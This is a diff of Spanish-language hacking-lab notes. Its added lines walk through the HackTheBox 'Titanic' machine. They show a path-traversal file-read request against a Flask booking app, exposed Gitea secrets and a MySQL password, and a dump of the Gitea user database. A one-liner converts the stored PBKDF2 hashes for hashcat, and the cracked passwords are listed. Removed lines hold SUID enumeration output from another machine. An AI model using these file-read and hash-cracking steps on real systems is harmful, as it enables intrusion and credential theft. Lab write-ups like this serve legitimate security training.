+El nombre del archivo es el siguiente 4852d90d-7587-420d-91e7-b4f84f2c539c.json parece que se genera un archivo de nombre aleatorio con el contenido rellenado del formulario;<br> {"name": "cher0", "email": "none@mail.com", "phone": "12345678", "date": "0002-02-02", "cabin": "Standard"}
+<br>capturamos la peticion que enviamos al servidor cuando clickeamos submit<br>
+<img alt="Pasted image 20250217170358.png" src="machines/titanic/imgs/pasted-image-20250217170358.png"><br>Nos redirige a la url http://titanic.htb/download?ticket=65449497-ae16-43b2-99f3-09656003ff09.json<br><br>Probamos a cambiar el nombre del archivo y nos da un not found; pero podemos leer archivos del sistema poniendo una ruta; realmente arcaico típico de la época del titanic.<br>
+<img alt="Pasted image 20250217170935.png" src="machines/titanic/imgs/pasted-image-20250217170935.png"><br>
+LFI:<br>http://titanic.htb/download?ticket=/etc/passwd
+<br>Nos descarga el siguiente archivo:  _etc_passwd<br><br>➜  nmap cat --plain ~/Descargas/_etc_passwd 
 root:x:0:0:root:/root:/bin/bash
-james:x:1000:1000:trickster:/home/james:/bin/bash
-adam:x:1002:1002::/home/adam:/bin/bash
-runner:x:1003:1003::/home/runner:/bin/sh
-<br>Seguimos en PrivEsc ---&gt; ]]></description><link>machines/trickster/1.recon.html</link><guid isPermaLink="false">Machines/Trickster/1.Recon.md</guid><pubDate>Thu, 13 Feb 2025 11:10:30 GMT</pubDate><enclosure url="machines/trickster/imgs/pasted-image-20250212101724.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/trickster/imgs/pasted-image-20250212101724.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[2.PrivEsc]]></title><description><![CDATA[ 
- <br><br>Directorio /var/www<br>www-data@trickster:~$ ls -la
-total 20
-drwxr-xr-x  5 root     root     4096 Sep 13 12:24 .
-drwxr-xr-x 14 root     root     4096 Sep 13 12:24 ..
-drwxr-xr-x  2 root     root     4096 Sep 13 12:24 html
-drwxr-xr-x 28 www-data www-data 4096 Sep 17 18:07 prestashop
-drwxr-xr-x  5 www-data www-data 4096 Feb 13 15:09 trickster
-<br><br>www-data@trickster:~$ find / -perm -4000 -print 2&gt;/dev/null
-/snap/core20/2379/usr/bin/chfn
-/snap/core20/2379/usr/bin/chsh
-/snap/core20/2379/usr/bin/gpasswd
-/snap/core20/2379/usr/bin/mount
-/snap/core20/2379/usr/bin/newgrp
-/snap/core20/2379/usr/bin/passwd
-/snap/core20/2379/usr/bin/su
-/snap/core20/2379/usr/bin/sudo
-/snap/core20/2379/usr/bin/umount
-/snap/core20/2379/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/snap/core20/2379/usr/lib/openssh/ssh-keysign
-/snap/core20/2318/usr/bin/chfn
-/snap/core20/2318/usr/bin/chsh
-/snap/core20/2318/usr/bin/gpasswd
-/snap/core20/2318/usr/bin/mount
-/snap/core20/2318/usr/bin/newgrp
-/snap/core20/2318/usr/bin/passwd
-/snap/core20/2318/usr/bin/su
-/snap/core20/2318/usr/bin/sudo
-/snap/core20/2318/usr/bin/umount
-/snap/core20/2318/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/snap/core20/2318/usr/lib/openssh/ssh-keysign
-/snap/snapd/21759/usr/lib/snapd/snap-confine
-/usr/libexec/polkit-agent-helper-1
-/usr/bin/chfn
-/usr/bin/sudo
-/usr/bin/newgrp
-/usr/bin/chsh
-/usr/bin/umount
-/usr/bin/mount
-/usr/bin/passwd
-/usr/bin/su
-/usr/bin/fusermount
-/usr/bin/gpasswd
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/lib/openssh/ssh-keysign
-/usr/lib/snapd/snap-confine
-/opt/google/chrome/chrome-sandbox
-<br>GUID<br>www-data@trickster:~$ find / -perm -2000 -print 2&gt;/dev/null
-/var/spool/postfix/public
-/var/mail
-/var/local
-/var/log/journal
-/var/log/journal/add7a2fa4f114fc2b05f9d28de9f9bb3
-/var/log/mysql
-/run/log/journal
-/snap/core20/2379/usr/bin/chage
-/snap/core20/2379/usr/bin/expiry
-/snap/core20/2379/usr/bin/ssh-agent
-/snap/core20/2379/usr/sbin/pam_extrausers_chkpwd
-/snap/core20/2379/usr/sbin/unix_chkpwd
-/snap/core20/2379/var/mail
-/snap/core20/2318/usr/bin/chage
-/snap/core20/2318/usr/bin/expiry
-/snap/core20/2318/usr/bin/ssh-agent
-/snap/core20/2318/usr/sbin/pam_extrausers_chkpwd
-/snap/core20/2318/usr/sbin/unix_chkpwd
-/snap/core20/2318/var/mail
-/usr/bin/expiry
-/usr/bin/dotlockfile
-/usr/bin/crontab
-/usr/bin/chage
-/usr/bin/ssh-agent
-/usr/sbin/postqueue
-/usr/sbin/unix_chkpwd
-/usr/sbin/postdrop
-/usr/sbin/pam_extrausers_chkpwd
-/usr/lib/x86_64-linux-gnu/utempter/utempter
-/usr/local/share/fonts
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
+tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+developer:x:1000:1000:developer:/home/developer:/bin/bash
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+_laurel:x:998:998::/var/log/laurel:/bin/false
 
-<br><br>Revisamos las conexiones de la maquina<br>$ netstat -tulnp
-(Not all processes could be identified, non-owned process info
- will not be shown, you would have to be root to see it all.)
-Active Internet connections (only servers)
+<br>Usuarios del sistema:<br>root:x:0:0:root:/root:/bin/bash
+developer:x:1000:1000:developer:/home/developer:/bin/bash
+<br><br>Sacamos el /etc/hosts del sistema mediante el LFI;<br>http://titanic.htb/download?ticket=/etc/hosts
+<br>descubrimos el subdominio dev.titanic.htb; podriamos haberlo sacado por fuzzing facilmente<br>127.0.0.1 localhost titanic.htb dev.titanic.htb
+127.0.1.1 titanic
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+<br><br>Lo anadimos a nuestro /etc/hosts:<br>10.10.11.55 titanic.htb dev.titanic.htb
+<br>➜  ~ nikto --url http://dev.titanic.htb
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          10.10.11.55
++ Target Hostname:    dev.titanic.htb
++ Target Port:        80
++ Start Time:         2025-02-17 18:09:06 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.52 (Ubuntu)
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ /v2/_catalog: Uncommon header 'docker-distribution-api-version' found, with contents: registry/2.0.
++ OPTIONS: Allowed HTTP Methods: ARRAY(0x55cdda20bb60) .
++ ERROR: Error limit (20) reached for host, giving up. Last error: 
++ Scan terminated: 0 error(s) and 4 item(s) reported on remote host
++ End Time:           2025-02-17 18:14:57 (GMT1) (351 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+<br><br>Nos encontramos con un Gitea:<br>
+<img alt="Pasted image 20250217171840.png" src="machines/titanic/imgs/pasted-image-20250217171840.png"><br>➜  ~ whatweb http://dev.titanic.htb
+http://dev.titanic.htb [200 OK] Apache[2.4.52], Cookies[_csrf,i_like_gitea], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], HttpOnly[_csrf,i_like_gitea], IP[10.10.11.55], Meta-Author[Gitea - Git with a cup of tea], Open-Graph-Protocol[website], PoweredBy[Gitea], Script, Title[Gitea: Git with a cup of tea], X-Frame-Options[SAMEORIGIN]
+<br>encuentro la versión de gitea; la 1.22.1 mirando el source code; desgraciadamente no encuentro un exploit o alguna vulnerabilidad en esta versión; hay un XSS para la 1.22 que en esta versión esta parcheada; Vuln: <a rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/exploits/52077" target="_blank">https://www.exploit-db.com/exploits/52077</a><br>Nos registramos en Gitea y entramos en explore; http://dev.titanic.htb/explore/repos<br>
+<img alt="Pasted image 20250217183141.png" src="machines/titanic/imgs/pasted-image-20250217183141.png"><br>
+encontramos un par de repositorios de developer; les echamos un ojo<br><br><br><img alt="Pasted image 20250217183246.png" src="machines/titanic/imgs/pasted-image-20250217183246.png"><br>
+Docker compose para la base de datos y su password;<br>version: '3.8'
+
+services:
+  mysql:
+    image: mysql:8.0
+    container_name: mysql
+    ports:
+      - "127.0.0.1:3306:3306"
+    environment:
+      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
+      MYSQL_DATABASE: tickets 
+      MYSQL_USER: sql_svc
+      MYSQL_PASSWORD: sql_password
+    restart: always
+<br>Vemos que la base de datos esta corriendo en el puerto 3306 pero no tenemos acceso de momento;<br><br>version: '3'
+
+services:
+  gitea:
+    image: gitea/gitea
+    container_name: gitea
+    ports:
+      - "127.0.0.1:3000:3000"
+      - "127.0.0.1:2222:22"  # Optional for SSH access
+    volumes:
+      - /home/developer/gitea/data:/data # Replace with your path
+    environment:
+      - USER_UID=1000
+      - USER_GID=1000
+    restart: always
+<br>Bueno tenemos ruta en local; el /data de gitea esta en /home/developer/gitea/data<br><br>Flask-app es el repositorio para la pagina web del booking de titanic<br>
+<img alt="Pasted image 20250217183543.png" src="machines/titanic/imgs/pasted-image-20250217183543.png"><br><br>from flask import Flask, request, jsonify, send_file, render_template, redirect, url_for, Response
+import os
+import json
+from uuid import uuid4
+
+app = Flask(__name__)
+
+TICKETS_DIR = "tickets"
+
+if not os.path.exists(TICKETS_DIR):
+    os.makedirs(TICKETS_DIR)
+
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+@app.route('/book', methods=['POST'])
+def book_ticket():
+    data = {
+        "name": request.form['name'],
+        "email": request.form['email'],
+        "phone": request.form['phone'],
+        "date": request.form['date'],
+        "cabin": request.form['cabin']
+    }
+
+    ticket_id = str(uuid4())
+    json_filename = f"{ticket_id}.json"
+    json_filepath = os.path.join(TICKETS_DIR, json_filename)
+
+    with open(json_filepath, 'w') as json_file:
+        json.dump(data, json_file)
+
+    return redirect(url_for('download_ticket', ticket=json_filename))
+
+@app.route('/download', methods=['GET'])
+def download_ticket():
+    ticket = request.args.get('ticket')
+    if not ticket:
+        return jsonify({"error": "Ticket parameter is required"}), 400
+
+    json_filepath = os.path.join(TICKETS_DIR, ticket)
+
+    if os.path.exists(json_filepath):
+        return send_file(json_filepath, as_attachment=True, download_name=ticket)
+    else:
+        return jsonify({"error": "Ticket not found"}), 404
+
+if __name__ == '__main__':
+    app.run(host='127.0.0.1', port=5000)
+<br><br>A partir del Docker-compose de gitea creo uno en local para observar la estructura de archivos<br>─# docker exec -it f4a35e1a9c34 bash
+f4a35e1a9c34:/# cd /data/
+f4a35e1a9c34:/data# ls
+git    gitea  ssh
+f4a35e1a9c34:/data# tree .
+.
+├── git
+├── gitea
+│   ├── conf
+│   │   └── app.ini
+│   └── log
+└── ssh
+    ├── ssh_host_ecdsa_key
+    ├── ssh_host_ecdsa_key.pub
+    ├── ssh_host_ed25519_key
+    ├── ssh_host_ed25519_key.pub
+    ├── ssh_host_rsa_key
+    └── ssh_host_rsa_key.pub
+
+5 directories, 7 files
+f4a35e1a9c34:/data# 
+
+<br>Si el docker-compose esta corriendo en la maquina podriamos ser capaces de sacar archivos del gitea; probamos a sacar el app.ini en la ruta : /home/developer/gitea/data/gitea/conf/app.ini<br>Usamos el lfi <br>http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/conf/app.ini
+<br>APP_NAME = Gitea: Git with a cup of tea
+RUN_MODE = prod
+RUN_USER = git
+WORK_PATH = /data/gitea
+
+[repository]
+ROOT = /data/git/repositories
+
+[repository.local]
+LOCAL_COPY_PATH = /data/gitea/tmp/local-repo
+
+[repository.upload]
+TEMP_PATH = /data/gitea/uploads
+
+[server]
+APP_DATA_PATH = /data/gitea
+DOMAIN = gitea.titanic.htb
+SSH_DOMAIN = gitea.titanic.htb
+HTTP_PORT = 3000
+ROOT_URL = http://gitea.titanic.htb/
+DISABLE_SSH = false
+SSH_PORT = 22
+SSH_LISTEN_PORT = 22
+LFS_START_SERVER = true
+LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4
+OFFLINE_MODE = true
+
+[database]
+PATH = /data/gitea/gitea.db
+DB_TYPE = sqlite3
+HOST = localhost:3306
+NAME = gitea
+USER = root
+PASSWD = 
+LOG_SQL = false
+SCHEMA = 
+SSL_MODE = disable
+
+[indexer]
+ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve
+
+[session]
+PROVIDER_CONFIG = /data/gitea/sessions
+PROVIDER = file
+
+[picture]
+AVATAR_UPLOAD_PATH = /data/gitea/avatars
+REPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars
+
+[attachment]
+PATH = /data/gitea/attachments
+
+[log]
+MODE = console
+LEVEL = info
+ROOT_PATH = /data/gitea/log
+
+[security]
+INSTALL_LOCK = true
+SECRET_KEY = 
+REVERSE_PROXY_LIMIT = 1
+REVERSE_PROXY_TRUSTED_PROXIES = *
+INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8
+PASSWORD_HASH_ALGO = pbkdf2
+
+[service]
+DISABLE_REGISTRATION = false
+REQUIRE_SIGNIN_VIEW = false
+REGISTER_EMAIL_CONFIRM = false
+ENABLE_NOTIFY_MAIL = false
+ALLOW_ONLY_EXTERNAL_REGISTRATION = false
+ENABLE_CAPTCHA = false
+DEFAULT_KEEP_EMAIL_PRIVATE = false
+DEFAULT_ALLOW_CREATE_ORGANIZATION = true
+DEFAULT_ENABLE_TIMETRACKING = true
+NO_REPLY_ADDRESS = noreply.localhost
+
+[lfs]
+PATH = /data/git/lfs
+
+[mailer]
+ENABLED = false
+
+[openid]
+ENABLE_OPENID_SIGNIN = true
+ENABLE_OPENID_SIGNUP = true
+
+[cron.update_checker]
+ENABLED = false
+
+[repository.pull-request]
+DEFAULT_MERGE_STYLE = merge
+
+[repository.signing]
+DEFAULT_TRUST_MODEL = committer
+
+[oauth2]
+JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g
+
+<br>Tenemos la ubicacion de la base de datos! <br>[database]
+PATH = /data/gitea/gitea.db
+<br>Usamos el lfi<br>http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db
+<br>sqlite3 gitea.db 
+SQLite version 3.46.1 2024-08-13 09:16:08
+Enter ".help" for usage hints.
+sqlite&gt; .tables
+access                     oauth2_grant             
+access_token               org_user                 
+action                     package                  
+action_artifact            package_blob             
+action_run                 package_blob_upload      
+action_run_index           package_cleanup_rule     
+action_run_job             package_file             
+action_runner              package_property         
+action_runner_token        package_version          
+action_schedule            project                  
+action_schedule_spec       project_board            
+action_task                project_issue            
+action_task_output         protected_branch         
+action_task_step           protected_tag            
+action_tasks_version       public_key               
+action_variable            pull_auto_merge          
+app_state                  pull_request             
+attachment                 push_mirror              
+auth_token                 reaction                 
+badge                      release                  
+branch                     renamed_branch           
+collaboration              repo_archiver            
+comment                    repo_indexer_status      
+commit_status              repo_redirect            
+commit_status_index        repo_topic               
+commit_status_summary      repo_transfer            
+dbfs_data                  repo_unit                
+dbfs_meta                  repository               
+deploy_key                 review                   
+email_address              review_state             
+email_hash                 secret                   
+external_login_user        session                  
+follow                     star                     
+gpg_key                    stopwatch                
+gpg_key_import             system_setting           
+hook_task                  task                     
+issue                      team                     
+issue_assignees            team_invite              
+issue_content_history      team_repo                
+issue_dependency           team_unit                
+issue_index                team_user                
+issue_label                topic                    
+issue_user                 tracked_time             
+issue_watch                two_factor               
+label                      upload                   
+language_stat              user                     
+lfs_lock                   user_badge               
+lfs_meta_object            user_blocking            
+login_source               user_open_id             
+milestone                  user_redirect            
+mirror                     user_setting             
+notice                     version                  
+notification               watch                    
+oauth2_application         webauthn_credential      
+oauth2_authorization_code  webhook                  
+sqlite&gt; 
+<br>Sacamos la tabla user;<br>
+<img alt="Pasted image 20250217184713.png" src="machines/titanic/imgs/pasted-image-20250217184713.png"><br>sqlite&gt; PRAGMA table_info(user);
+0|id|INTEGER|1||1
+1|lower_name|TEXT|1||0
+2|name|TEXT|1||0
+3|full_name|TEXT|0||0
+4|email|TEXT|1||0
+5|keep_email_private|INTEGER|0||0
+6|email_notifications_preference|TEXT|1|'enabled'|0
+7|passwd|TEXT|1||0
+8|passwd_hash_algo|TEXT|1|'argon2'|0
+9|must_change_password|INTEGER|1|0|0
+10|login_type|INTEGER|0||0
+11|login_source|INTEGER|1|0|0
+12|login_name|TEXT|0||0
+13|type|INTEGER|0||0
+14|location|TEXT|0||0
+15|website|TEXT|0||0
+16|rands|TEXT|0||0
+17|salt|TEXT|0||0
+18|language|TEXT|0||0
+19|description|TEXT|0||0
+20|created_unix|INTEGER|0||0
+21|updated_unix|INTEGER|0||0
+22|last_login_unix|INTEGER|0||0
+23|last_repo_visibility|INTEGER|0||0
+24|max_repo_creation|INTEGER|1|-1|0
+25|is_active|INTEGER|0||0
+26|is_admin|INTEGER|0||0
+27|is_restricted|INTEGER|1|0|0
+28|allow_git_hook|INTEGER|0||0
+29|allow_import_local|INTEGER|0||0
+30|allow_create_organization|INTEGER|0|1|0
+31|prohibit_login|INTEGER|1|0|0
+32|avatar|TEXT|1||0
+33|avatar_email|TEXT|1||0
+34|use_custom_avatar|INTEGER|0||0
+35|num_followers|INTEGER|0||0
+36|num_following|INTEGER|1|0|0
+37|num_stars|INTEGER|0||0
+38|num_repos|INTEGER|0||0
+39|num_teams|INTEGER|0||0
+40|num_members|INTEGER|0||0
+41|visibility|INTEGER|1|0|0
+42|repo_admin_change_team_access|INTEGER|1|0|0
+43|diff_view_style|TEXT|1|''|0
+44|theme|TEXT|1|''|0
+45|keep_activity_private|INTEGER|1|0|0
+sqlite&gt; PRAGMA table_info(user);
+0|id|INTEGER|1||1
+1|lower_name|TEXT|1||0
+2|name|TEXT|1||0
+3|full_name|TEXT|0||0
+4|email|TEXT|1||0
+5|keep_email_private|INTEGER|0||0
+6|email_notifications_preference|TEXT|1|'enabled'|0
+7|passwd|TEXT|1||0
+8|passwd_hash_algo|TEXT|1|'argon2'|0
+9|must_change_password|INTEGER|1|0|0
+10|login_type|INTEGER|0||0
+11|login_source|INTEGER|1|0|0
+12|login_name|TEXT|0||0
+13|type|INTEGER|0||0
+14|location|TEXT|0||0
+15|website|TEXT|0||0
+16|rands|TEXT|0||0
+17|salt|TEXT|0||0
+18|language|TEXT|0||0
+19|description|TEXT|0||0
+20|created_unix|INTEGER|0||0
+21|updated_unix|INTEGER|0||0
+22|last_login_unix|INTEGER|0||0
+23|last_repo_visibility|INTEGER|0||0
+24|max_repo_creation|INTEGER|1|-1|0
+25|is_active|INTEGER|0||0
+26|is_admin|INTEGER|0||0
+27|is_restricted|INTEGER|1|0|0
+28|allow_git_hook|INTEGER|0||0
+29|allow_import_local|INTEGER|0||0
+30|allow_create_organization|INTEGER|0|1|0
+31|prohibit_login|INTEGER|1|0|0
+32|avatar|TEXT|1||0
+33|avatar_email|TEXT|1||0
+34|use_custom_avatar|INTEGER|0||0
+35|num_followers|INTEGER|0||0
+36|num_following|INTEGER|1|0|0
+37|num_stars|INTEGER|0||0
+38|num_repos|INTEGER|0||0
+39|num_teams|INTEGER|0||0
+40|num_members|INTEGER|0||0
+41|visibility|INTEGER|1|0|0
+42|repo_admin_change_team_access|INTEGER|1|0|0
+43|diff_view_style|TEXT|1|''|0
+44|theme|TEXT|1|''|0
+45|keep_activity_private|INTEGER|1|0|0
+sqlite&gt; select * from user;
+1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
+2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1739811719|1739810910|1|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|4|0|0|0|0|unified|gitea-auto|0
+3|test1|test1||test@xd.es|0|enabled|0e8d030d481c54a651a8cdb73c6fdb1b2900565ae1f7e95e9a943954fbf722565b76ed69fbae560a4bd55c1e75b9c5262900|pbkdf2$50000$50|0|0|0||0|||16220263a7a014a36bfc775908e2a1ac|fbbe897c5f7e2acc7e9662da1c6033f8|en-US||1739809739|1739814281|1739809739|0|-1|1|0|0|0|0|1|0|02ae5d68572414d3591b9fed657d41b2|test@xd.es|0|0|0|0|1|0|0|0|0|unified|gitea-auto|0
+4|hahalol|hahalol||hahalol@gmail.com|0|enabled|f5cbd21458ebc24ae462926e851e21a953030e5f8bdc9f57633bb235b6944a08ae3e91036c8f7f13fd647edb942e3724b7b2|pbkdf2$50000$50|0|0|0||0|||4c43d3ea816ae4f8d0b095f993aad8bc|04c1e5c82ea5009599842f28ffa2b649|en-US||1739810105|1739812965|1739812965|0|-1|1|0|0|0|0|1|0|f1c8843f54a0e2794ea7538d408e0e91|hahalol@gmail.com|0|0|0|0|1|0|0|0|0||gitea-auto|0
+5|hacker|hacker||hacker@gmail.com|0|enabled|2ce159ff197379b8598217f304fd62bf23553e51a12b30a50de4ecfc12add4214e88f2969edaa95be6b416eb659db8fb1f98|pbkdf2$50000$50|0|0|0||0|||5ca5776c7a616e8b19b67059de2d1b60|c7b686bac36b14f11712b6e027f73bb7|en-US||1739811981|1739812071|1739811981|0|-1|1|0|0|0|0|1|0|5f2e8c3605a2730d521d111a617aa968|hacker@gmail.com|0|0|0|0|1|0|0|0|0||gitea-auto|0
+6|kali|kali||kali@kali.com|0|enabled|1cb922c696dee762c018ad606f8fd7eca87f9642809a3197c98eb661a5e74f1a4a49bed44ef9417d798b5cdb46064d0698bc|pbkdf2$50000$50|0|0|0||0|||be731a58906c441c4afe7e48bef44c7f|ccdee931405a2f5a1178661a185f64b6|en-US||1739812724|1739813242|1739812724|0|-1|1|0|0|0|0|1|0|951dc43cb482734c43d5f7f49dadcff0|kali@kali.com|0|0|0|0|1|0|0|0|0|unified|gitea-auto|0
+7|tester|tester||tester@test.com|0|enabled|2a17317ce9211b8e4e44a75de69f017403528d30c0e6c0355ea9af7c350e19c6e1702a5cf90dc6652fc92cb2ac425231d79d|pbkdf2$50000$50|0|0|0||0|||6acd35897112b2862fb07ed947853558|ccf6419a6bc1132e547f5dd94057f124|en-US||1739813080|1739813081|1739813080|0|-1|1|0|0|0|0|1|0|0db53901eca1472a8997a38a24b38d06|tester@test.com|0|0|0|0|0|0|0|0|0||gitea-auto|0
+8|cher0|cher0||none@mail.com|0|enabled|2f1bd1ee4c28629a3fdc8105c8fa3fa47972dc805531aa49b962b309ad7177e83b0506f22eb94873740565f1f434fd2d6d3b|pbkdf2$50000$50|0|0|0||0|||596dccd8ab821622a2a629dc7b5c2bc5|569a0839ffaa6c4a19489a5d1006cf12|en-US||1739813478|1739813900|1739813478|0|-1|1|0|0|0|0|1|0|12a1623f22ef4eec2da37b32549cb0ee|none@mail.com|0|0|0|0|0|0|0|0|0|unified|gitea-auto|0
+sqlite&gt; 
+<br><br><br>
+<br>
+Algoritmo de hashing :
+
+<br>El campo passwd_hash_algo indica que el algoritmo utilizado es PBKDF2 .
+
+
+<br>
+Configuración del hash :
+
+<br>Según el valor pbkdf2$50000$50:
+
+<br>Iteraciones : 50,000.
+<br>Longitud del hash : 50 bytes (en formato hexadecimal).
+<br>Función hash subyacente : SHA-512 (implícito en PBKDF2).
+
+
+
+
+<br>
+Salt :
+
+<br>El salt está almacenado en el campo salt. Por ejemplo:
+
+<br>Para el usuario administrator: 70a5bd0c1a5d23caa49030172cdcabdc.
+<br>Para el usuario developer: 0ce6f07fc9b557bc070fa7bef76a0d15.
+
+
+
+
+<br>
+Estructura del hash :
+
+<br>El hash final (passwd) es el resultado de aplicar PBKDF2 sobre la contraseña original, utilizando el salt correspondiente y realizando 50,000 iteraciones. (esta jodida...)
+
+
+<br>Script para sacar el hash de la base de datos;<br>sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
+<br>administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
+developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
+test1:sha256:50000:+76JfF9+Ksx+lmLaHGAz+A==:Do0DDUgcVKZRqM23PG/bGykAVlrh9+lempQ5VPv3IlZbdu1p+65WCkvVXB51ucUmKQA=
+hahalol:sha256:50000:BMHlyC6lAJWZhC8o/6K2SQ==:9cvSFFjrwkrkYpJuhR4hqVMDDl+L3J9XYzuyNbaUSgiuPpEDbI9/E/1kftuULjckt7I=
+hacker:sha256:50000:x7aGusNrFPEXErbgJ/c7tw==:LOFZ/xlzebhZghfzBP1ivyNVPlGhKzClDeTs/BKt1CFOiPKWntqpW+a0Futlnbj7H5g=
+kali:sha256:50000:zN7pMUBaL1oReGYaGF9ktg==:HLkixpbe52LAGK1gb4/X7Kh/lkKAmjGXyY62YaXnTxpKSb7UTvlBfXmLXNtGBk0GmLw=
+tester:sha256:50000:zPZBmmvBEy5Uf13ZQFfxJA==:KhcxfOkhG45ORKdd5p8BdANSjTDA5sA1XqmvfDUOGcbhcCpc+Q3GZS/JLLKsQlIx150=
+cher0:sha256:50000:VpoIOf+qbEoZSJpdEAbPEg==:LxvR7kwoYpo/3IEFyPo/pHly3IBVMapJuWKzCa1xd+g7BQbyLrlIc3QFZfH0NP0tbTs=
+<br>hashcat:<br>hashcat gitea.hashes rockyou.txt --user
+<br><br>developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
+test1:sha256:50000:+76JfF9+Ksx+lmLaHGAz+A==:Do0DDUgcVKZRqM23PG/bGykAVlrh9+lempQ5VPv3IlZbdu1p+65WCkvVXB51ucUmKQA=:123456789
+hacker:sha256:50000:x7aGusNrFPEXErbgJ/c7tw==:LOFZ/xlzebhZghfzBP1ivyNVPlGhKzClDeTs/BKt1CFOiPKWntqpW+a0Futlnbj7H5g=:12345678
